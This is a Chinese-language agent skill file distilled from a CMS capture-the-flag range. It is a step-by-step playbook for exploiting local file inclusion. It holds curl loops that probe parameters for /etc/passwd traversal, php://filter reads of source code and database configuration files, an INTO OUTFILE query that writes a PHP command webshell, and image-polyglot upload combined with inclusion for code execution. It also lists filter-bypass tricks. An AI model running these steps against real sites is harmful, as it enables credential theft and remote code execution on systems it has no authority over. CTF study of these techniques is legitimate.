---
name: cfi-cms-lfi
description: 从CMS CTF实战中总结的LFI（本地文件包含）利用技巧。当目标CMS存在文件包含漏洞时使用，涵盖php://filter读源码、配合SQL注入提权、文件上传绕过等。触发词：LFI、文件包含、php://filter、读源码、CMS拿shell。
---

# CMS LFI 利用实战技巧

从 `http://212.129.223.186:81` CMS靶场总结。

## 1. 发现LFI漏洞

**测试方法：** 遍历所有页面的GET参数，尝试包含 `/etc/passwd`：

```bash
# 遍历参数名
for param in page file p inc include path action mod module; do
    curl "http://target/page.php?$param=../../../../etc/passwd" | grep "root:"
done

# 遍历页面
for page in index.php page.php show.php list.php notice.php search.php; do
    curl "http://target/$page?file=../../../../etc/passwd" | grep "root:"
done
```

**判断标准：** 响应中出现 `root:x:0:0:` 即确认LFI。

## 2. php://filter 读PHP源码

直接 `include('flag.php')` 会执行PHP代码（可能500报错），用 `php://filter` base64编码绕过：

```bash
# 读PHP源码（不执行）
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=flag.php"

# 带路径
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=/var/www/html/flag.php"

# 不带扩展名（CMS可能自动加.php）
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=flag"
```

**解码：**
```bash
echo "PD9waHAgZmxhZ3..." | base64 -d
```

**为什么有效：** `php://filter` 是PHP内置的流包装器，`convert.base64-encode` 过滤器将PHP源码编码为base64输出，避免了PHP执行。`include()` 读取的是编码后的内容，原样输出到页面。

## 3. LFI常见目标

```
/etc/passwd                              # 用户枚举
/proc/self/environ                       # 环境变量
/proc/self/cmdline                       # 进程命令行
/var/log/apache2/access.log              # 日志投毒
/var/log/apache2/error.log               # 错误日志
php://filter/convert.base64-encode/resource=config.php  # 配置文件源码
php://filter/convert.base64-encode/resource=index.php   # 入口文件源码
php://filter/convert.base64-encode/resource=../include/config.inc.php  # 数据库配置
```

## 4. 读取数据库配置

拿到数据库凭据后可以进一步利用：

```bash
# 读数据库配置
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=include/database.inc.php"
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=include/config.inc.php"
```

## 5. LFI + SQL注入组合拳

当LFI暴露了数据库凭据但MySQL用户没有FILE权限时：

1. **LFI读配置** → 拿到数据库密码
2. **用密码直连MySQL** → 可能获得更高权限
3. **高权限用户** → `SELECT ... INTO OUTFILE` 写webshell

```bash
# 用拿到的密码直连
mysql -h localhost -u cms -p123456 cms

# 如果root权限，写webshell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

## 6. LFI + 文件上传组合

当有文件上传但扩展名被限制时：

1. **上传含PHP代码的图片**（GIF/PNG头 + `<?php ... ?>`）
2. **LFI包含图片文件** → PHP代码被执行

```bash
# 上传shell.gif (GIF89a + PHP代码)
# 然后通过LFI包含
curl "http://target/index.php?file=attachment/202605/shell.gif"
```

**关键：** LFI绕过了Apache的MIME类型限制，因为 `include()` 以PHP模式处理任何文件。

## 7. flag.php返回500的处理

当PHP文件因语法错误返回500时：

```bash
# ❌ 直接访问拿不到内容
curl "http://target/flag.php"  # 500 Internal Server Error

# ✅ 用php://filter读源码
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=flag.php"
# 返回: PD9waHAgZmxhZ3t4eHh4fTsgPz4=
# 解码: <?php flag{xxxx}; ?>
```

**原理：** 500错误是因为PHP代码语法不合法（如 `flag{trxeduyy}` 不是PHP函数），但源码本身是存在的。`php://filter` 读取原始字节，不经过PHP解析器。

## 8. 防御绕过笔记

| 防御 | 绕过 |
|------|------|
| `include($file . ".php")` | `php://filter/convert.base64-encode/resource=flag` （自动加.php） |
| 禁止 `../` | `....//` 双写绕过（递归替换只删一次） |
| 禁止 `php://` | `phar://` 或 `zip://` |
| 限制路径 | `/proc/self/fd/N` 日志文件描述符 |
| null byte截断 | 仅 PHP < 5.3.4 有效 |

## 9. 完整利用流程（本次实战）

```
1. 发现 index.php?file= 参数 → 测试 LFI
2. ../../../../etc/passwd 确认漏洞
3. php://filter/convert.base64-encode/resource=flag.php → 拿到flag
4. php://filter/.../resource=include/config.inc.php → 拿到数据库配置
5. （可选）用数据库密码进一步提权或写shell
```

## 注意事项

- `php://filter` 路径相对于网站根目录，不是文件系统绝对路径
- base64编码后的输出可能被HTML页面模板包裹，需要提取base64部分
- 如果CMS对 `php://` 做了过滤，尝试大小写混写 `Php://filter` 或双写 `phpphp://`
- Windows环境下用 Python `base64.b64decode()` 解码，PowerShell处理长base64容易出错
